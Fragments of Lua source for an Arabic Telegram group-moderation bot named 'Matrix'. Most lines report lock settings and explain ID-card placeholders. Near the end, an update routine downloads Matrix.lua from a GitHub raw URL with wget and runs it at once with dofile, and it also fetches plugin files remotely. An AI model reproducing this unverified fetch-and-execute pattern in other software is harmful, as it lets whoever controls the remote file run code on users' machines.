Dev_Abs(msg.chat_id_, msg.id_, 1, '⌔︙رجائا اتبع التعليمات للتعيين \n⌔︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉', 1, 'md')
DevAbs:set("Matrix:New:id:"..Matrix..msg.chat_id_..msg.sender_user_id_,'MatrixTEAM')
return "MatrixTEAM"
end
...
function MatrixTEAM(extra,abbas,success)
...
if text == "الروابط" then if DevAbs:get(Matrix..'Abs:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local MatrixTEAM = "\n" .."⌔︙الروابط ↫ "..mute_links.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "المعرف" or text == "المعرفات" then if DevAbs:get(Matrix..'Abs:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local MatrixTEAM = "\n" .."⌔︙المعرف ↫ "..lock_tag.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "المتحركه" or text == "الملصقات المتحركه" then if DevAbs:get(Matrix..'Abs:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local MatrixTEAM = "\n" .."⌔︙المتحركه ↫ "..mute_gifs.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "الملصقات" then if DevAbs:get(Matrix..'Abs:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local MatrixTEAM = "\n" .."⌔︙الملصقات ↫ "..lock_sticker.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "الصور" then if DevAbs:get(Matrix..'Abs:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local MatrixTEAM = "\n" .."⌔︙الصور ↫ "..mute_photo.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "الفيديو" or text == "الفيديوهات" then if DevAbs:get(Matrix..'Abs:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local MatrixTEAM = "\n" .."⌔︙الفيديو ↫ "..mute_video.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "الاونلاين" then if DevAbs:get(Matrix..'Abs:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local MatrixTEAM = "\n" .."⌔︙الاونلاين ↫ "..mute_in.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "الدردشه" then if DevAbs:get(Matrix..'Abs:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local MatrixTEAM = "\n" .."⌔︙الدردشه ↫ "..mute_text.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "التوجيه" or text == "اعاده التوجيه" then if DevAbs:get(Matrix..'Abs:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local MatrixTEAM = "\n" .."⌔︙التوجيه ↫ "..lock_forward.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "الاغاني" then if DevAbs:get(Matrix..'Abs:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local MatrixTEAM = "\n" .."⌔︙الاغاني ↫ "..mute_music.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "الصوت" or text == "الصوتيات" then if DevAbs:get(Matrix..'Abs:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local MatrixTEAM = "\n" .."⌔︙الصوت ↫ "..mute_voice.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "الجهات" or text == "جهات الاتصال" then if DevAbs:get(Matrix..'Abs:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local MatrixTEAM = "\n" .."⌔︙الجهات ↫ "..lock_contact.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "الماركداون" then if DevAbs:get(Matrix..'Abs:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local MatrixTEAM = "\n" .."⌔︙الماركداون ↫ "..markdown.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "الهاشتاك" then if DevAbs:get(Matrix..'Abs:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local MatrixTEAM = "\n" .."⌔︙الهاشتاك ↫ "..lock_htag.."\n"Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "التعديل" then if DevAbs:get(Matrix..'Abs:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local MatrixTEAM = "\n" .."⌔︙التعديل ↫ "..mute_edit.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "التثبيت" then if DevAbs:get(Matrix..'Abs:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local MatrixTEAM = "\n" .."⌔︙التثبيت ↫ "..lock_pin.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "الاشعارات" then if DevAbs:get(Matrix..'Abs:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local MatrixTEAM = "\n" .."⌔︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "الكلايش" then if DevAbs:get(Matrix..'Abs:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local MatrixTEAM = "\n" .."⌔︙الكلايش ↫ "..lock_spam.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "الدخول" then if DevAbs:get(Matrix..'Abs:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local MatrixTEAM = "\n" .."⌔︙الدخول ↫ "..lock_Join.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "الشبكات" then if DevAbs:get(Matrix..'Abs:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local MatrixTEAM = "\n" .."⌔︙الشبكات ↫ "..lock_wp.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "المواقع" then if DevAbs:get(Matrix..'Abs:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local MatrixTEAM = "\n" .."⌔︙المواقع ↫ "..lock_location.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "العربيه" then if DevAbs:get(Matrix..'Abs:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local MatrixTEAM = "\n" .."⌔︙العربيه ↫ "..lock_arabic.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "الانكليزيه" then if DevAbs:get(Matrix..'Abs:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local MatrixTEAM = "\n" .."⌔︙الانكليزيه ↫ "..lock_english.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "الكفر" then if DevAbs:get(Matrix..'Abs:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local MatrixTEAM = "\n" .."⌔︙الكفر ↫ "..lock_kaf.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "الفشار" then if DevAbs:get(Matrix..'Abs:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local MatrixTEAM = "\n" .."⌔︙الفشار ↫ "..lock_fshar.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
if text == "الطائفيه" then if DevAbs:get(Matrix..'Abs:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local MatrixTEAM = "\n" .."⌔︙الطائفيه ↫ "..lock_taf.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, MatrixTEAM, 1, 'md') end
end
--     Source Matrix     --
...
return false end
if text and text:match("^(.*)$") then
local MatrixTEAM =  DevAbs:get(Matrix..'Abs:Help0'..msg.sender_user_id_)
if MatrixTEAM == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
...
return false end
if text and text:match("^(.*)$") then
local MatrixTEAM =  DevAbs:get(Matrix..'Abs:Help01'..msg.sender_user_id_)
if MatrixTEAM == 'msg' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
...
return false end
if text and text:match("^(.*)$") then
local MatrixTEAM =  DevAbs:get(Matrix..'Abs:Help21'..msg.sender_user_id_)
if MatrixTEAM == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
...
return false end
if text and text:match("^(.*)$") then
local MatrixTEAM =  DevAbs:get(Matrix..'Abs:Help31'..msg.sender_user_id_)
if MatrixTEAM == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
...
return false end
if text and text:match("^(.*)$") then
local MatrixTEAM =  DevAbs:get(Matrix..'Abs:Help41'..msg.sender_user_id_)
if MatrixTEAM == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
...
return false end
if text and text:match("^(.*)$") then
local MatrixTEAM =  DevAbs:get(Matrix..'Abs:Help51'..msg.sender_user_id_)
if MatrixTEAM == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
...
return false end
if text and text:match("^(.*)$") then
local MatrixTEAM =  DevAbs:get(Matrix..'Abs:Help61'..msg.sender_user_id_)
if MatrixTEAM == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
...
os.execute('wget https://raw.githubusercontent.com/MatrixTame/Matrix/master/Matrix.lua') 
dofile('Matrix.lua') 
...
local Get_Files, res = https.request("https://raw.githubusercontent.com/MatrixTame/MatrixFiles/master/getfile.json")
if res == 200 then
...
local GetJson, Res = https.request("https://raw.githubusercontent.com/MatrixTame/MatrixFiles/master/MatrixFiles/"..FileName)
if Res == 200 then
